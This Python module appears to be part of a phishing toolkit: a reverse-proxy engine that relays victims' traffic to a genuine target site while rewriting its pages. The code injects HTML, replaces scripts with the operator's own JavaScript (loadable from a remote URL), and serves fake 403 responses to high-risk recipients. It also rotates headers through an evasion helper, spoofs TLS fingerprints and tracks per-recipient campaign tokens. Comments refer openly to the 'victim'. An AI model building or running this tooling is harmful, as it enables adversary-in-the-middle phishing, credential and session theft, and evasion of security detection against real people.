"""Reverse proxy engine that forwards traffic to target URLs with real-time content manipulation.

This module runs a proxy server on a separate thread/port so it does NOT conflict
with Flask's existing routes. It is activated per-campaign when flow_type = "reverse_proxy".
"""

import asyncio
import json
import logging
import re
import threading
from datetime import datetime, timezone
from urllib.parse import urljoin, urlparse, urlunparse

import httpx
from bs4 import BeautifulSoup

from .plugin_system import (
    apply_plugin_request_hooks,
    apply_plugin_response_hooks,
)
from .tls_transport import build_async_client
from .playwright_transport import build_playwright_client, PlaywrightClientAdapter
from dropoutjeep_lib.utils.evasion import rotate_headers

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Rule engine — operates on request/response pairs
# ---------------------------------------------------------------------------

from .types import Request, Response


class Rule:
    """A single manipulation rule, mirroring goblin's plugin system."""

    def __init__(self, rule_dict: dict):
        self.url_pattern = rule_dict.get("url", "")
        self.match = rule_dict.get("match", "word")  # word | prefix | regex
        self.methods = rule_dict.get("methods", ["GET", "POST"])
        self.replace = rule_dict.get("replace", {})
        self.inject_js = rule_dict.get("inject_js", None)
        self.dump = rule_dict.get("dump", False)
        # GAP 9: when true, skip body parsing/modification for this path.
        self.stream = rule_dict.get("stream", False)
        # GAP 10: conditional application based on per-recipient risk score.
        self.if_risk_gt = rule_dict.get("if_risk_gt")
        self.if_click_count_gt = rule_dict.get("if_click_count_gt")

    def matches(self, path: str) -> bool:
        if not self.url_pattern:
            return False
        if self.match == "word":
            return self.url_pattern in path
        elif self.match == "prefix":
            return path.startswith(self.url_pattern)
        elif self.match == "regex":
            try:
                return bool(re.search(self.url_pattern, path))
            except re.error:
                return False
        return False

    def _conditions_met(self, ctx: dict) -> bool:
        """Return True when recipient-based risk/click conditions are satisfied."""
        if self.if_risk_gt is not None:
            if ctx.get("risk_score", 0) <= self.if_risk_gt:
                return False
        if self.if_click_count_gt is not None:
            if ctx.get("click_count", 0) <= self.if_click_count_gt:
                return False
        return True

    def apply_request(self, req: Request, ctx: dict) -> Request:
        """Modify request headers / body before forwarding."""
        if not self._conditions_met(ctx):
            return req
        req_ops = self.replace.get("request", {})
        if self.methods and req.method not in self.methods:
            return req

        # Header modifications
        header_ops = req_ops.get("header", {})
        for key, value in header_ops.items():
            if value == "":  # empty string means delete
                req.headers.pop(key, None)
                req.headers.pop(key.lower(), None)
            elif value:
                req.headers[key] = self._interpolate(value, ctx)

        return req

    def apply_response(self, resp: Response, ctx: dict) -> Response:
        """Modify response headers / body before sending to victim."""
        if not self._conditions_met(ctx):
            return resp
        resp_ops = self.replace.get("response", {})
        if self.methods and ctx.get("method") not in self.methods:
            return resp

        # Status code override (e.g. fake 403 for high-risk victims).
        status_override = resp_ops.get("status")
        if status_override is not None:
            try:
                resp.status_code = int(status_override)
            except (ValueError, TypeError):
                pass

        # Header modifications
        header_ops = resp_ops.get("header", {})
        for key, value in header_ops.items():
            if value == "":
                resp.headers.pop(key, None)
                resp.headers.pop(key.lower(), None)
            elif value:
                resp.headers[key] = self._interpolate(value, ctx)

        # Body modifications
        body_ops = resp_ops.get("body", {})
        if body_ops:
            content_type = (resp.headers.get("content-type") or
                           resp.headers.get("Content-Type") or "").lower()
            if "html" in content_type or resp.body and resp.body.startswith("<"):
                soup = BeautifulSoup(resp.body, "lxml")

                append_html = body_ops.get("append", "")
                prepend_html = body_ops.get("prepend", "")
                replace_selector = body_ops.get("replace_selector", {})

                if prepend_html:
                    self._inject_into_head(soup, self._interpolate(prepend_html, ctx))
                if append_html:
                    self._inject_before_body_end(soup, self._interpolate(append_html, ctx))
                if replace_selector:
                    for selector, new_html in replace_selector.items():
                        for tag in soup.select(selector):
                            tag.clear()
                            tag.append(BeautifulSoup(new_html, "lxml"))

                resp.body = str(soup)

            # Non-HTML body replacement (raw string substitution)
            search_str = body_ops.get("search", "")
            replace_str = body_ops.get("replace", "")
            if search_str and replace_str:
                resp.body = resp.body.replace(search_str, self._interpolate(replace_str, ctx))

        # JS Injection (replaces a JS file URL with operator's JS)
        if self.inject_js:
            js_url = self.inject_js.get("url", "")
            js_file = self.inject_js.get("file", "")
            if js_url and js_file and ctx.get("path", "").endswith(js_url):
                # Load operator's JS from disk or URL
                js_content = self._load_js(js_file)
                if js_content:
                    resp.body = js_content

        return resp

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _interpolate(self, template: str, ctx: dict) -> str:
        """Replace {{ .Static }}, {{ .Token }}, etc."""
        s = template.replace("{{ .Static }}", ctx.get("static_prefix", "/static/"))
        s = s.replace("{{ .Token }}", ctx.get("token", ""))
        s = s.replace("{{ .CampaignID }}", str(ctx.get("campaign_id", "")))
        return s

    def _inject_into_head(self, soup, html):
        head = soup.find("head")
        if head:
            head.append(BeautifulSoup(html, "lxml"))

    def _inject_before_body_end(self, soup, html):
        body = soup.find("body")
        if body:
            body.append(BeautifulSoup(html, "lxml"))

    def _load_js(self, path_or_url: str) -> str | None:
        """Load JS from local file or remote URL."""
        import os
        if path_or_url.startswith(("http://", "https://")):
            try:
                r = httpx.get(path_or_url, timeout=10)
                return r.text
            except Exception:
                return None
        if os.path.isfile(path_or_url):
            try:
                with open(path_or_url, "r", encoding="utf-8") as f:
                    return f.read()
            except Exception:
                return None
        return None


# ---------------------------------------------------------------------------
# Proxy request handler
# ---------------------------------------------------------------------------

async def proxy_request(
    client: httpx.AsyncClient,
    method: str,
    target_url: str,
    path: str,
    headers: dict,
    query_params: dict,
    body,
    rules: list[Rule],
    ctx: dict,
    plugins: list | None = None,
) -> Response:
    """Forward one request to the target and apply plugins + rules."""
    full_url = urljoin(target_url, path)
    if query_params:
        full_url = full_url + "?" + "&".join(f"{k}={v}" for k, v in query_params.items())

    # Strip hop-by-hop headers
    hop_by_hop = {
        "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
        "te", "trailers", "transfer-encoding", "upgrade", "host",
    }
    fwd_headers = {k: v for k, v in headers.items() if k.lower() not in hop_by_hop}

    # Rotate browser-like headers when enabled for the campaign.
    if ctx.get('header_rotation_enabled'):
        seed = ctx.get('recipient_token') or ctx.get('campaign_id')
        fwd_headers = rotate_headers(fwd_headers, seed=str(seed))

    # Build Request object for rule engine
    req = Request(method, path, fwd_headers, query_params, body)

    # GAP 3/4: Run Python plugin request hooks first.
    plugins = plugins or []
    req = apply_plugin_request_hooks(req, ctx, plugins)

    # Apply request rules (YAML rules run after plugins).
    for rule in rules:
        if rule.matches(path):
            req = rule.apply_request(req, ctx)

    # Forward with rules-applied headers
    request_kwargs = dict(
        method=req.method,
        url=full_url,
        headers=req.headers,
        params=req.query_params,
        content=req.body,
        follow_redirects=False,
        timeout=30,
    )
    if isinstance(client, PlaywrightClientAdapter):
        request_kwargs["ctx"] = ctx
        request_kwargs["plugins"] = plugins
    try:
        resp = await client.request(**request_kwargs)
    except httpx.RequestError as e:
        return Response(502, {"content-type": "text/plain"}, f"Proxy error: {e}".encode())

    # GAP 9: Decide whether to buffer + modify, or pass through raw.
    ctx["method"] = method
    ctx["path"] = path

    content_type = (resp.headers.get("content-type") or "").lower()
    content_length = resp.headers.get("content-length")
    max_buffer = ctx.get("max_buffer_size", 10 * 1024 * 1024)
    any_stream_rule = any(getattr(r, "stream", False) and r.matches(path) for r in rules)

    should_passthrough = any_stream_rule or (
        not _should_buffer_content_type(content_type)
        or (content_length is not None and int(content_length) > max_buffer)
    )

    if should_passthrough:
        body_bytes = resp.content
        return Response(
            status_code=resp.status_code,
            headers=dict(resp.headers),
            body="",
            raw_body=body_bytes,
            passthrough=True,
        )

    # Build Response object for buffered modification.
    body_bytes = resp.content
    resp_obj = Response(
        status_code=resp.status_code,
        headers=dict(resp.headers),
        body=body_bytes.decode("utf-8", errors="replace") if body_bytes else "",
    )

    # GAP 3/4: Run Python plugin response hooks before YAML rules.
    resp_obj = apply_plugin_response_hooks(req, resp_obj, ctx, plugins)

    # Apply response rules (YAML rules run after plugins).
    for rule in rules:
        if rule.matches(path):
            resp_obj = rule.apply_response(resp_obj, ctx)

    return resp_obj


def _should_buffer_content_type(content_type: str) -> bool:
    """Return True for content types we inspect and modify."""
    return any(ct in content_type for ct in ("text/html", "text/plain", "application/json"))


# ---------------------------------------------------------------------------
# Upstream proxy helpers
# ---------------------------------------------------------------------------

def _normalize_proxy_url(proxy_url: str | None) -> str | None:
    """Validate and normalize an upstream proxy URL.

    Supported schemes: http, https, socks5.
    Returns None for empty/invalid values.
    """
    if not proxy_url:
        return None
    proxy_url = proxy_url.strip()
    if not proxy_url:
        return None
    parsed = urlparse(proxy_url)
    if parsed.scheme not in ("http", "https", "socks5", "socks5h"):
        logger.warning("Unsupported upstream proxy scheme: %s", parsed.scheme)
        return None
    return proxy_url


# ---------------------------------------------------------------------------
# ASGI/WSGI adapter — proxy endpoint that Flask can call
# ---------------------------------------------------------------------------

_proxy_workers: dict[tuple[str | None, str | None, str | None], "ProxyWorker"] = {}
_proxy_lock = threading.Lock()


def get_proxy_worker(
    proxy_url: str | None = None,
    tls_fingerprint: str | None = None,
    renderer: str | None = None,
):
    """Return a ProxyWorker keyed by upstream proxy URL + TLS fingerprint + renderer.

    Each unique combination gets its own adapter so campaigns using different
    browser fingerprints or renderers do not share a transport.
    """
    proxy_url = _normalize_proxy_url(proxy_url)
    key = (proxy_url, tls_fingerprint or None, renderer or None)
    with _proxy_lock:
        worker = _proxy_workers.get(key)
        if worker is None:
            worker = ProxyWorker(
                proxy_url=proxy_url,
                tls_fingerprint=tls_fingerprint,
                renderer=renderer,
            )
            _proxy_workers[key] = worker
        return worker


class ProxyWorker:
    """Manages the async HTTP client lifecycle and provides a synchronous
    interface for Flask to call from a background thread."""

    def __init__(
        self,
        proxy_url: str | None = None,
        tls_fingerprint: str | None = None,
        renderer: str | None = None,
    ):
        self.proxy_url = _normalize_proxy_url(proxy_url)
        self.tls_fingerprint = tls_fingerprint or None
        self.renderer = renderer or None
        self.client = None
        self._loop = None

    def _ensure_loop(self):
        if self._loop is None or self._loop.is_closed():
            self._loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self._loop)
        return self._loop

    def _ensure_client(self):
        if self.client is None:
            if self.renderer == "playwright":
                self.client = build_playwright_client(
                    proxy_url=self.proxy_url,
                    verify=False,  # Accept self-signed certs on target
                    timeout=30,
                )
            if self.client is None:
                self.client = build_async_client(
                    tls_fingerprint=self.tls_fingerprint,
                    proxy_url=self.proxy_url,
                    verify=False,  # Accept self-signed certs on target
                    timeout=30,
                )
        return self.client

    def handle(self, method, target_url, path, headers, query_params, body, rules, ctx,
               plugins=None):
        """Synchronous entry point called from Flask routes."""
        loop = self._ensure_loop()
        client = self._ensure_client()
        return loop.run_until_complete(
            proxy_request(client, method, target_url, path, headers, query_params, body,
                          rules, ctx, plugins=plugins)
        )

    async def close(self):
        if self.client:
            await self.client.close()
            self.client = None


def close_all_proxy_workers():
    """Close every cached proxy worker. Useful for graceful shutdown."""
    with _proxy_lock:
        workers = list(_proxy_workers.values())
        _proxy_workers.clear()
    for worker in workers:
        try:
            loop = worker._ensure_loop()
            loop.run_until_complete(worker.close())
        except Exception:
            logger.exception("Failed to close proxy worker")
